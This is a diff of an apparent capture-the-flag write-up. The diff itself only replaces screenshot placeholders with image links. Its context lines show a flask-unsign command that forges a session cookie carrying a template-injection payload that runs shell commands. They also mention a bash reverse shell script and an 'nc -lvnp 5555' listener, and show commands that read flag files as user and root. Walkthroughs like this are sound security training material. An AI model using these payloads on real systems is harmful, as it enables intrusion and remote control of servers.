@@ -108,7 +108,7 @@ flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoie3tjb25m
 flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class__.__init__.__globals__[\"os\"].popen(\"ls\").read()}}'}" --secret 'f#bKR!$@T7dCL4@By!MyYKqzMrReSGeNTC7X&@ry'
 ```
 
-[SCREEN01]
+<img width="505" height="278" alt="SCREEN01" src="https://github.com/user-attachments/assets/6149dd22-48f3-45c5-922c-88c40ffe0984" />
 
 9. On the attacker machine, create a bash reverse shell script. When executed on the target, it will open a TCP connection back to our machine.
 
@@ -140,7 +140,7 @@ flask-unsign --sign --cookie "{'logged_in': True, 'username': '{{config.__class_
 cat /home/bill/flag1.txt
 ```
 
-[SCREEN02]
+<img width="371" height="241" alt="SCREEN02" src="https://github.com/user-attachments/assets/6ac4d4b6-3c46-40ea-9302-57dc6cafec63" />
 
 ---
 
@@ -248,4 +248,4 @@ nc -lvnp 5555
 cat /root/flag2.txt
 ```
 
-[SCREEN03]
+<img width="454" height="584" alt="SCREEN03" src="https://github.com/user-attachments/assets/5feb2094-0956-43de-a73f-2325f7050ba6" />
